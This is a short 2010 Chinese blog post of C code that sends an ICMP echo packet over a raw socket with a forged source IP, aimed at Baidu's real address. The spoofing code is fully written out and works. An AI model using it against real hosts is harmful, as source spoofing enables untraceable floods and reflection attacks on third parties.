Title: linux下伪装ICMP攻击的实现     
Date: 2010-04-24           
Category: 编程语言      
Tags: Python  

#linux下伪装ICMP攻击的实现

@(编程语言)[信息安全, C]

```c
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>

#include "exam.h"
char buffer[1024];

/*校验码的计算*/
unsigned short cksum(unsigned char *data, int len)
{
	int sum=0;
	int odd = len & 0x01;
	unsigned short *value = (unsigned short*)data; 
	while( len & 0xfffe)
	{
	   sum += *(unsigned short*)data;
	   data += 2;
	   len -=2;
	}
	if(odd)
	{
	   unsigned short tmp = ((*data)<<8)&0xff00;
	   sum += tmp;
	}
	sum = (sum >>16) + (sum & 0xffff);
	sum += (sum >>16) ;       
	return ~sum; 
}

int main()
{
	int s;
	int ret = 0; 
	int on = 1; 
	struct icmp * icmp; 
	struct ip * ip = (struct ip *)buffer; 
	struct sockaddr_in addr;
	
	s = socket(AF_INET, SOCK_RAW, 1); //使用原始套接字
	failure("socket", s, -1); 
	memset(buffer, '\0', 1024);
	
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("119.75.213.51"); //百度的ip，目的是伪造IP地址给百度发数据包
	
	ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)); //自己构造ip头的选项
	failure("setsockopt", ret, -1);
	
	/*ip头的信息*/
	ip->ip_hl = 5; ip->ip_v = 4; ip->ip_tos = 0; ip->ip_len = htons(32); 
	ip->ip_id = 0; ip->ip_off = 0; 
	ip->ip_ttl = 56; ip->ip_p = 1; ip->ip_sum = 0;  
	ip->ip_src.s_addr = inet_addr("192.168.205.199"); //这是伪造的ip，本机的ip当然不是这个啦 
	ip->ip_dst.s_addr = inet_addr("119.75.213.51");
	
	/*icmp头信息*/
	icmp = (struct icmp*)(buffer+20); 
	icmp->icmp_type = ICMP_ECHO; icmp->icmp_code=0; icmp->icmp_cksum =0;
	icmp->icmp_id = 1234; icmp->icmp_seq = 8080;
	icmp->icmp_cksum = cksum((char*)icmp, 12);
	
	/*发送*/
	ret = sendto(s, buffer, 32, 0, (struct sockaddr*)&addr, sizeof(addr));
	failure("send", ret, -1);
	
	return 0;
}
```

PS: exam.h是我为了些程序方便而定义的一些错误处理的宏，文件内容如下：

```c
#ifndef EXAM_H
#define EXAM_H

#include <stdio.h>
#include <stdlib.h>

#define failure(msg, ret, error_code) \
{              \
	if(ret == error_code)       \
	{             \
	   perror(msg);        \
	   exit(EXIT_FAILURE);      \
	}             \
}

#define success(msg, ret, success_code)\
{              \
	if(ret != success_code)      \
	{             \
	   perror(msg);        \
	   exit(EXIT_FAILURE);      \
	}             \
}

#endif
```